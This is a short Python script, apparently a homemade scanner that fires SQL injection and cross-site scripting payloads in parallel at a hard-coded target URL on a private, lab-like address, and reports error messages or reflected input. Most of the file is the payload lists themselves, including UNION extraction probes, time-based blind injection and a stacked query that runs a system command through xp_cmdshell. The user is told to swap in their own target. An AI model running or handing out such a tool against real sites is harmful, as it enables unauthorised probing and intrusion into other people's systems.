import requests
import threading
import re

# Replace the URL with your target URL, make sure include the URL parameter 
# For example, if the URL is "...?page=1", then the parameter is "page".
url = "http://10.10.10.17/techmind/dashboard.php?id="

parameter = re.search(r"[&?](\w+)=", url).group(1) # Do not change this

payloads = {
    "SQLi": [
        "'", 
        "' OR '1'='1", 
        "\" OR \"1\"=\"1", 
        "'; --", 
        "' UNION SELECT 1,2,3 --",
        "' OR 1=1--", 
        "' OR 'a'='a' --", 
        "' OR 1=1#", 
        "' AND 1=0 UNION SELECT NULL,NULL--", 
        "' OR EXISTS(SELECT * FROM users)--",
        "' AND (SELECT COUNT(*) FROM users) > 0 --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' OR 1=1 LIMIT 1; --",
        "' OR SLEEP(5)--",  # Time-based blind SQLi
        "' OR '1'='1' /*",
        "' AND 1=CONVERT(int, (SELECT @@version))--"
    ],
    "XSS": [
        "<script>alert('XSS')</script>", 
        "'><img src=x onerror=alert('XSS')>", 
        "<svg/onload=alert('XSS')>", 
        "<body onload=alert('XSS')>", 
        "<iframe src='javascript:alert(`XSS`)'></iframe>",
        "<math><mtext></mtext><script>alert('XSS')</script></math>",
        "<details open ontoggle=alert('XSS')>",
        "<video><source onerror=\"javascript:alert('XSS')\"></video>",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=1 onerror=confirm(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<a href='javascript:alert(\"XSS\")'>click</a>"
    ]
}

sqli_errors = [
    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
    "Unknown column", "Warning: mysql_fetch", "Fatal error"
]

def scan_payload(vuln_type, payload):
    response = requests.get(url, params={parameter: payload})
    content = response.text.lower()

    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
        print(f"[+] Potential SQL injection detected with payload: {payload}")

    elif vuln_type == "XSS" and payload.lower() in content:
        print(f"[+] Potential XSS detected with payload: {payload}")

threads = []
for vuln, tests in payloads.items():
    for payload in tests:
        t = threading.Thread(target=scan_payload, args=(vuln, payload))
        threads.append(t)
        t.start()

# Wait for all threads to finish
for t in threads:
    t.join()